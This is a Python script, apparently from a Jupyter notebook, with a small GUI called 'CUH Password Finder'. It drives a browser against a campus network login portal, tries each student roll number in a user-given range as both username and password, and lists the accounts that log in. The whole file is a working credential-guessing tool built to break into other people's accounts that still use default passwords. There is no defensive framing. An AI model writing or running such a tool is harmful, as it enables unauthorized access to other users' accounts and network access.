#!/usr/bin/env python
# coding: utf-8

# In[1]:


from selenium import webdriver
from tkinter import *
from tkinter import ttk
from tkinter import messagebox
import time
from selenium.webdriver.common.keys import Keys


# In[8]:
root  = Tk()
root.title('CUH Password Finder')
root.geometry('290x100')
# Progress Bar
progress_var = DoubleVar()
progress = ttk.Progressbar(root, variable=progress_var ,orient=HORIZONTAL,length=200,maximum=100,mode='determinate')

def password():
    roll_no = []
    try:
        starting_roll_no = int(entrybox_roll_starting.get())
        last_roll_no = int(entrybox_roll_last.get())
    except:
        messagebox.showerror('Invalid ID','Please Enter a valid Roll Number')
        return None
    driver = webdriver.Firefox()
    try:
        driver.get('http://10.10.0.1:8090/')
    except:
        messagebox.showerror('Connection Error','Please Connect to CUH internet')

    user_name = driver.find_element_by_xpath('/html/body/form/div[1]/div[2]/div[2]/table/tbody/tr[2]/td/input')
    password = driver.find_element_by_xpath('/html/body/form/div[1]/div[2]/div[2]/table/tbody/tr[4]/td/input')
    submit_btn = driver.find_element_by_id('logincaption')
    
    for i in range(starting_roll_no,last_roll_no):
        percentage = int((i-starting_roll_no)/(last_roll_no-starting_roll_no)*100)
        progress_var.set(percentage)
        root.update_idletasks()
        user_name.send_keys(str(i))
        password.send_keys(str(i))
        submit_btn.click()
        try:
            submit_text = driver.find_element_by_class_name('note')
            roll_no.append(i)
            pop_up = driver.switch_to.default_content()
            submit_btn.click()
        except:
            pass
        user_name.send_keys(Keys.CONTROL + "a");
        user_name.send_keys(Keys.DELETE);
    if (len(roll_no)) is 0:
        messagebox.showinfo('Sorry',':(\n Could not find any Roll number')
    else:
        messagebox.showinfo('Here are the roll Numbers',":)\n Yah, I Found these Roll Numbers\n"+str(roll_no))


# Labels
label_roll_starting = ttk.Label(root,text='Enter Starting Roll Number')
label_roll_starting.grid(row=0,column=0,sticky=W)
label_roll_last = ttk.Label(root,text='Enter Last Roll Number')
label_roll_last.grid(row=1,column=0,sticky=W)

# Entry Boxes
start_roll = StringVar()
entrybox_roll_starting = ttk.Entry(root,textvariable=start_roll)
entrybox_roll_starting.grid(row=0,column=1)
entrybox_roll_starting.focus()
last_roll = StringVar()
entrybox_roll_last = ttk.Entry(root,textvariable=last_roll)
entrybox_roll_last.grid(row=1,column=1)

# Buttons
submit_btn = ttk.Button(root,text='Find Password',command=password)
submit_btn.grid(row=2,column=0)

exit_btn = ttk.Button(root,text='Exit',command=root.destroy)
exit_btn.grid(row=2,column=1)

# progress bar
progress.grid(row=3,columnspan=3)
    


root.mainloop()




